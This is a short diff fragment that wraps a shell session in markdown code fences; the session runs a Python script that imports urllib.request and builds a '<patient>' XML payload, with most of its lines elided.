@@ -1,3 +1,4 @@
+```python
 sedric@interpreter:~$ python3 - <<'EOF'
 import urllib.request
 payload = b"""<patient>
@@ -18,3 +19,4 @@ try:
 except Exception as e:
     print("ERR:", e)
 EOF
+```
